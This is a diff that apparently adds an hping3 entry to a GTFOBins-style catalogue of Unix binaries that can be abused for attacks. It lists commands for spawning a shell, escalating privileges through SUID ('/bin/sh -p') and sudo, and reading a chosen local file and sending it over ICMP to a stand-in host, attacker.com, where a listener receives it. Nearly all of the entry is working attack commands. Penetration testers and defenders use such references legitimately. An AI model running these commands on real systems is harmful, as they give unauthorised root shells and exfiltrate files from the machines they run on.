@@ -1,0 +1,23 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "hping3\n/bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./hping3\n/bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo hping3\n/bin/sh\n"
+      },
+      {
+        "description": "The file is continuously sent, adjust the `--count` parameter or kill the sender when done. Receive on the attacker box with:\n\n```\nsudo hping3 --icmp --listen xxx --dump\n```\n",
+        "code": "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n"
+      }
+    ]
+  }
+}
